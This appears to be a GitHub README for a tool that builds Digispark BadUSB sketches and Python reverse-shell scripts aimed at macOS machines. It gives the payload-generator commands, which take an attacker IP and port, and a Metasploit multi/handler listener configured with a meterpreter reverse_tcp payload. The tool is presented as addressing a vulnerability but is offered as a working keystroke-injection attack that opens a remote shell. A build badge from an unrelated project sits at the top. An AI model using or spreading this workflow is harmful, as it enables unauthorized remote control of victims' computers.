![Build Status](https://github.com/subsurface/subsurface/workflows/Mac/badge.svg)

## What is digispark?
Digispark is a Attiny85 based microcontroller that can be used as trusted HID-MIDI device. This project addresses its vulnerbility, which injects malicious code into the machine. 

## Digispark reverse shell

The script creates either reverse shell python script or arduino sketch for digispark. The script is compatible with metasploit.</br>
This Digispark sketch is intended to run on OS X operating System.


## Features

- Creates a reverse shell python script
- Creates a Arduino sketch for digispark

## Arduino Configuration

To flash the microcontroller, you need to add this link to your boards maneger</br>
Arduino > File > Preferences > Additional Boards Manager URLs:
```
https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json
```

Once the link is added, head over to Tools > Bord > Boards Manager, search for "Digistump AVR Boards" and make sure it is installed.


## Installation

Clone this repository
``` 
git clone https://github.com/https-sam/digispark_reverse_shell.git
```

```
cd scripts
```

`-p and -i tags` are required.
```
python3 payloadGenerator.py -i IP ADDRESS -p PORT
```

`-py True` is optional, which only creates a python reverse shell script.
```
python3 payloadGenerator.py -i IP Address -p PORT -py True
```


## Set up

Metsploit can be used as a listener
``` 
msfconsole
use multi/handler
set payload python/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport PORT
run
````



## License

MIT


- [Digistump](https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h) - Library for digispark
- [Micronucleus](https://github.com/micronucleus/micronucleus) - processor
- [Metasploit](https://github.com/rapid7/metasploit-framework) 


